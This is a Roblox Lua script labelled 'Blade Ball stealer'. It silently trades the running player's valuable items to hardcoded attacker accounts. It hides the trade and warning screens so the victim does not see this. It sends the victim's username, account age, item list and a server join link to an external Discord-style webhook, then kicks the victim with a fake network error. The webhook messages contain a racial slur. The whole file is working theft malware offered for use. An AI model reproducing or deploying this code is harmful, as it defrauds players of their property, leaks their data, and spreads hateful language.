-- Configuration
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Interfaces
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local inTrade = false

local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Paramètres
local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
local webhook = _G.webhook or "" 
local auth_token = _G.AuthToken or "EBK-SS-A"
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "Yes"

---------------------------------------------------------
-- CACHE DE L'INTERFACE (INVISIBLE POUR LA VICTIME)
---------------------------------------------------------
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
    maintradegui.Visible = false
end)

local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
    unfairTade.Visible = false
end)

local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    notificationsFrame.Visible = false
end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

---------------------------------------------------------
-- FONCTIONS DE TRADE (TES FONCTIONS)
---------------------------------------------------------

local function readyTrade()
    local args = {[1] = true}
    repeat 
        task.wait(0.2) 
        local success = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
    until success == true
end

local function confirmTrade()
    repeat 
        task.wait(0.2) 
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() 
    until not inTrade
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getRAP(category, itemName)
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

---------------------------------------------------------
-- WEBHOOK AVEC THUMBNAIL ET @EVERYONE
---------------------------------------------------------

local function SendStatusWebhook(title, color, isStart)
    local itemLines = ""
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do
        itemLines = itemLines .. "• " .. item.Name .. " (x1) - " .. formatNumber(item.RAP) .. " RAP\n"
        totalRAP = totalRAP + item.RAP
    end

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (isStart and ping == "Yes") and "@everyone | game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')" or nil,
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = {
                {name = "ℹ️ Player info:", value = "```\n🆔 Username: "..plr.Name.."\n👤 Display: "..plr.DisplayName.."\n📅 Age: "..plr.AccountAge.." Days```", inline = false},
                {name = "Join link 🔗:", value = "[Click to Join](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ")", inline = false},
                {name = "Item list 📝:", value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```", inline = false},
                {name = "Summary 💰:", value = "```Total RAP: " .. formatNumber(totalRAP) .. "```", inline = false}
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

---------------------------------------------------------
-- LOGIQUE DE TRADE AUTOMATIQUE AVEC CONFIRMATION
---------------------------------------------------------

local function startAutoTrade(targetPlayer)
    task.spawn(function()
        while #itemsToSend > 0 do
            -- 1. Envoyer la requête
            repeat 
                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
                task.wait(1.5)
            until inTrade

            -- 2. Ajouter les items (max 100 par trade)
            local limit = 0
            while #itemsToSend > 0 and limit < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                limit = limit + 1
                task.wait(0.05)
            end

            -- 3. CONFIRMATION DU TRADE (TES FONCTIONS)
            readyTrade() -- Appuie sur Ready
            confirmTrade() -- Appuie sur Confirm et attend la fin
            
            task.wait(1) -- Petit délai de sécurité entre deux trades
        end
        
        SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false)
        task.wait(1)
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end)
end

---------------------------------------------------------
-- INITIALISATION
---------------------------------------------------------

for _, cat in ipairs(categories) do
    for id, info in pairs(clientInventory[cat]) do
        if not info.TradeLock then
            local rap = getRAP(cat, info.Name)
            if rap >= min_rap then
                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendStatusWebhook("🟣 Bro join your hit nigga 🎯", 8323327, true)

    local function checkAndTrade()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then
                SendStatusWebhook("✅ The nigga is on the server ! 🎉", 65280, false)
                startAutoTrade(p)
                return true
            end
        end
        return false
    end

    if not checkAndTrade() then
        Players.PlayerAdded:Connect(function(player)
            if table.find(users, player.Name) then
                SendStatusWebhook("✅ The nigga is on the server ! 🎉", 65280, false)
                startAutoTrade(player)
            end
        end)
    end
end
